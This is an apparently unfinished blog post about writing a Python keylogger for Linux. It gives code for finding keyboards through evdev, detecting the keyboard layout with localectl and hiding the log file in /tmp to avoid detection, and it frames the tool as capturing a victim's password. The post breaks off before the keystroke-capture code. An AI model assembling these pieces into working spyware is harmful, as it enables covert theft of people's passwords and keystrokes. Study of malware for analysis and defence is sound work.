---
title: "Creating a Python Keylogger for Linux Systems"
excerpt: A rough guide on how to build a simple Keylogger for Linux OS, using Python and Bash.
date: 2025-10-05
---

Recently, I've been dabbling a little in malware analysis. Mostly it's quite involved and I only have a basic understanding of some important concepts and tools. So my idea was to start with a more hands-on approach: try to implement some form of malware myself! I came across a video of a very bare-bones Python Windows keylogger and decided I would try the same for Linux systems.

I had a few goals in mind for this project:
- Improve my Python coding skills
- Build a (somewhat) reliable keylogger for Linux systems with either German or English keyboard layouts
- Gain some insight into malware development

> **Note**
> 
> It should be obvious that I will not share the entire source code for my keylogger, as this could easily be abused by adversaries. Instead, I will share only some important snippets to explain the most important syntax and the logic of the program. This project's intention is purely educational.

## 1 Writing the Code

The original motivation for using Python was because of the `evdev` library, which sits at the heart of the logger. In short, this library gives us read access to the raw key/mouse/gamepad input from `/dev/input/`. Altogether, we don't even need to import too many external libraries and modules:
```py
from evdev import InputDevice, list_devices, ecodes
import time
import os
from datetime import datetime
import subprocess
import re
```
I imported `datetime` to fill the logs with additional information later on, and `os` in order to create/edit files on the OS on which the keylogger is executed. 

The basic logic of the logger is as follows:
1. Find all available keyboards in `/dev/input`
2. Determine the layout of the keyboard(s)
3. Declare a key map for either layout
4. Create a text file into which the characters/keys will be written
5. Write data into text file

### 1.1 Determining the Keyboard Layout

The first step is to find all attached keyboards and finding their layout. Otherwise we might work under the assumption that we are logging an English layout, while in reality it may be German, which would significantly obscure the logs in the end. To my surprise, finding the layouts was not entirely straightforward. I had expected the syntax to be something like
```text
find.os: systemsettings > keyboard > language > English [inactive], German [active]
```
and then we could simply pick the active one. Instead, the the source code for this looks like this:
```py
keyboards = []
for device_path in list_devices():
    try:
        device = InputDevice(device_path)
        caps = device.capabilities()
        if ecodes.EV_KEY in caps:
            key_caps = caps[ecodes.EV_KEY]
            if ecodes.KEY_A in key_caps and ecodes.KEY_SPACE in key_caps:
                keyboards.append(device)
    except:
        continue
if not keyboards:
    exit(1)

def get_keyboard_layout():    
    german_map = { ... }
    us_map = { ... }
    try:
        output = subprocess.check_output(["localectl"], text=True)
        match = re.search(r"X11 Layout:\s*(\S+)", output)
        if match:
            layout = match.group(1).lower()
        else:
            layout = "unknown"
    except (subprocess.CalledProcessError, FileNotFoundError):
        layout = "unknown"
    if layout == "de":
        return "de", german_map
    else:
        return "us", us_map
```
The first part of the snippet does the following:
1. Initialise a list into which all available keyboards are written
2. The loop runs over `/dev/input/event0`, `/dev/input/event1` etc. until a keyboard is found
3. Next, we actually check whether the device *is* a keyboard. To do this, we list the *capabilities* of the device and check whether it can generate key press/release events with `if ecodes.EV_KEY in caps:`.
4. If it can, then we check for common keyboard keys (to make sure the device is not a mouse, for instance) with `if ecodes.KEY_A in key_caps and ecodes.KEY_SPACE in key_caps:`. This is more of a sanity check and we could have chosen different keys here.
5. In this case, the device is classified as a keyboard and is appended to `keyboards`. In most cases, this list will obviously contain only one item.

The second part, i.e. the function `get_keyboard_layout`, determines the language the keyboard is set to. To achieve this, we make use of the terminal command `localectl`, which outputs something like
```console
$ localectl
   System Locale: LANG=de_DE.UTF-8
       VC Keymap: n/a
      X11 Layout: de
       X11 Model: pc105
```
This means that we can extract the X11 Layout with some Python code, which can be seen in the above function. Moreover, I defined two key maps `german_map` and `us_map`, which give a one-to-one mapping between keys and characters. For instance, `german_map` includes `..., 37: 'k', 38: 'l', 39: 'รถ',...`. If we want to include further layouts, we should do it in this function. 

These maps also include special keys like `[ENTER]` and `[BACKSPACE]`. This is important for the following reason: say we run the keylogger on the target machine and the victim starts typing their password `Passwd%123` but they accidentally press the `w` key twice. In order to keep track of the real password, we want the output to be `Passww[BACKSPACE]d%123`, and not `Passwwd%123`. Later we could additionally write a script that deletes `[BACKSPACE]` together with the character preceding it.

Another consideration is upper case characters. We could simply make the keylogger output `[SHIFT]a` instead of `A`, but with some additional Python code we can make sure that capitalization is respected.

## 1.2 Writing Characters into a Text File

Now that we have determined the keyboard layout, we still need to write a function which captures the key strokes and appends them to a text file, that we can extract when the logging is done. First of all, we must decide where to store the file. To avoid detection, a keylogger must store its log file in a location that is both hidden from the user and allows the program to write to it without special permissions. A natural candidate for this is the `/tmp` directory. One can go further and create more subdirectories, perhaps mimicking existing ones such as 
```text
systemd-private-f2ba2e3a8d7c44c1b9ab924ca6d3748d-systemd-timesyncd.service-DZPBIs
```
For a simple proof of concept, I decided to write the output into `/tmp/.hidden.txt`, just to add one more layer of detection avoidance. In the code, we simply use the `os` library to create the file:
```py
log_dir = "/tmp/"
log_file = os.path.join(log_dir, ".hidden.txt")

try:
    os.makedirs(log_dir, exist_ok=True)
except Exception as e:
    exit(1)
```
Next, we start writing into the text file. **WIP**







